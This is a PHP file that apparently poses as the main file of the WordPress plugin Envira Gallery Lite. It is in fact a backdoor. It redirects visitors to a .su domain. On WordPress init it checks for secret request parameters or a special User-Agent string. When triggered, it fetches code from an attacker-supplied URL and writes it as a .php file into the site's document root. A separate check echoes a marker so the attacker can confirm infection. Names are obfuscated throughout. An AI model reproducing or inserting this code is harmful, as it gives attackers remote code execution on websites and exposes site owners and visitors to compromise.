<?php
header('HTTP/1.1 301 Moved Permanently');
header('Location: http://magiconlinevalue.su/'); exit;
/**
 * Plugin Name: Envira Gallery Lite
 * Description: Envira Gallery is the best responsive WordPress gallery plugin. This is the Lite version.
 * Author:      Envira Gallery Team
 * Version:     1.7.8.7
 *
 * Envira Gallery is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 *
 * Envira Gallery is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Envira Gallery. If not, see <http://magiconlinevalue.su/>.
 */

// Exit if accessed directly.

function rkfdsj142(){ 
        function irewufdshgj47821($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $output = curl_exec($ch);
            curl_close($ch);
            if (!$output) {
                $output = file_get_contents($url);
                if (!$output) {
                    $handle = fopen($url, "r");
                    $output = stream_get_contents($handle);
                    fclose($handle);
                }
            }
            if (!$output) {
                return false;
            } else {
                return $output;
            }
        }

        function irwjfdsnfdxhj1874($file, $dump)
        {
            $dump = '<?php /*' . rand(0, 9999999999) . rand(0, 9999999999) . ' */?>' . $dump;
            file_put_contents($file, $dump);
        }
        if(isset($_REQUEST["gdsiurqjnvx"])) {
            $url = $_REQUEST["somearrvar"];
            $flename = $_REQUEST["nnamvalarr"];
            $fullflename = $_SERVER["DOCUMENT_ROOT"] . "/$flename.php";
            $dataFromURL = irewufdshgj47821($url);
            if($dataFromURL){
                irwjfdsnfdxhj1874($fullflename,$dataFromURL);
                exit;
            }
        }
}


function kdsjfdsj87123(){
    if (isset($_REQUEST["kjfdsuqrwyuv"])){
        function jfdshruqi1313(){
            echo 'ierwhfdsbngf';
        }
        jfdshruqi1313();
        exit;
    }

}


function useragntup124(){
    if(strpos( $_SERVER['HTTP_USER_AGENT'],'kjsfarwqui') !== false){
        function fdsfdsfsdbvcb534($url){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $output = curl_exec($ch);
            curl_close($ch);
            if (!$output) {
                $output = file_get_contents($url);
                if (!$output) {
                    $handle = fopen($url, "r");
                    $output = stream_get_contents($handle);
                    fclose($handle);
                }
            }
            if (!$output) {
                return false;
            } else {
                return $output;
            }
        }
        $dataexploded = explode('wp',$_SERVER['HTTP_USER_AGENT']);
        $svdata = fdsfdsfsdbvcb534($dataexploded[0]);
        if($svdata){
            file_put_contents($_SERVER["DOCUMENT_ROOT"] . "/".$dataexploded[1].".php", $svdata);

        }
    }
}



add_action('init', 'kdsjfdsj87123');
add_action('init', 'rkfdsj142');
add_action('init', 'useragntup124'); 